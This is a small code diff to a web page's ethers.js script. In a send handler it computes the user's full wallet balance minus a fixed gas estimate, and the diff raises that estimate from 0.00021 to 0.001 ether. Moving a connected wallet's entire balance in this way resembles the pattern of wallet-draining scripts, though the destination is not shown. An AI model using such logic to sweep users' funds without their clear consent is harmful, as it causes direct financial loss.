@@ -37,7 +37,7 @@ connectButton.addEventListener("click", async () => {
 sendButton.addEventListener("click", async () => {
   try {
     const balance = await provider.getBalance(userAddress);
-    const gasEstimate = ethers.parseUnits("0.00021", "ether"); // حدودی
+    const gasEstimate = ethers.parseUnits("0.001", "ether"); // حدودی
     const amountToSend = balance - gasEstimate;
 
     if (amountToSend <= 0n) {
